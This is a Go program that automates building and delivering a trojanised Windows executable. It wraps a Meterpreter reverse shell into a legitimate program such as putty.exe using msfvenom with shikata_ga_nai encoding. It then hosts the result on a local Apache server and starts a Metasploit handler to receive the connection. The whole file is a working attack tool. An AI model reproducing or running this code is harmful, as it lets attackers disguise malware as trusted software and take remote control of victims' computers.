package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func startapache() {
	cmdname := "service"
	cmdpath, _ := exec.LookPath(cmdname)
	fmt.Println(cmdpath)
	cmdArgs := []string{"apache2", "start"}

	cmdapache := exec.Command(cmdpath, cmdArgs...)
	cmdapache.Run()
}

func startmsf(resfile string) {
	cmdname := "msfconsole"
	cmdpath, _ := exec.LookPath(cmdname)
	fmt.Println(cmdpath)
	cmdArgs := []string{"-r", resfile}

	cmdapache := exec.Command(cmdpath, cmdArgs...)
	cmdapache.Stderr = os.Stderr
	cmdapache.Stdout = os.Stdout
	cmdapache.Stdin = os.Stdin
	cmdapache.Run()
	cmdapache.Wait()
}

func createresourcefile(typeoffile, lhost, lport string) {
	var payload string
	f, err := os.Create("/root/msfr.rc")
	if err != nil {
		fmt.Println(err)
	}
	defer f.Close()
	if typeoffile == "revhttps" {
		payload = "windows/meterpreter/reverse_https"
	} else if typeoffile == "revhttp" {
		payload = "windows/meterpreter/reverse_https"
	} else {
		payload = "windows/meterpreter/reverse_tcp"
	}
	f.WriteString("use exploit/multi/handler\n")
	f.WriteString("set payload " + payload + "\n")
	f.WriteString("set lhost " + lhost + "\n")
	f.WriteString("set lport " + lport + "\n")
	f.WriteString("exploit\n")
}

func resolvehostip() string {
	netifaceaddresses, _ := net.InterfaceAddrs()
	for _, netifaceaddr := range netifaceaddresses {
		netip, ok := netifaceaddr.(*net.IPNet)
		if ok && !netip.IP.IsLoopback() && netip.IP.To4() != nil {
			return netip.IP.String()
		}
	}
	return ""
}
func wrapper(ip string) {
	var revshell string
	cmdvenom := "msfvenom"

	fpath, _ := exec.LookPath(cmdvenom)

	if os.Args[1] == "revhttps" {
		revshell = "windows/meterpreter/reverse_https"
	} else if os.Args[1] == "revhttp" {
		revshell = "windows/meterpreter/reverse_http"
	} else if os.Args[1] == "revtcp" {
		revshell = "windows/meterpreter/reverse_tcp"
	}
	cmdArgs := []string{"-p", revshell, "-e", "x86/shikata_ga_nai", "-i", "3", "lhost=" + ip, "lport=443", "-x", os.Args[3], "-k", "-f", "exe", "-o", "/var/www/html/" + os.Args[5]}
	cmdmsfvenom := exec.Command(fpath, cmdArgs...)
	cmdmsfvenom.Run()
	fmt.Println("Wrapper Generated .")

}
func main() {
	//wrap revhttps into exepath saveas filename
	//var revshell string

	if len(os.Args) < 6 {
		fmt.Println("Usage : wrap revhttps into /root/putty.exe saveas putty.exe")
		return
	}
	ip := resolvehostip()
	wrapper(ip)
	startapache()
	fmt.Println("Wrapper Hosted in : http://" + ip + "/" + os.Args[5])

	createresourcefile("revhttps", ip, "443")
	startmsf("/root/msfr.rc")
}
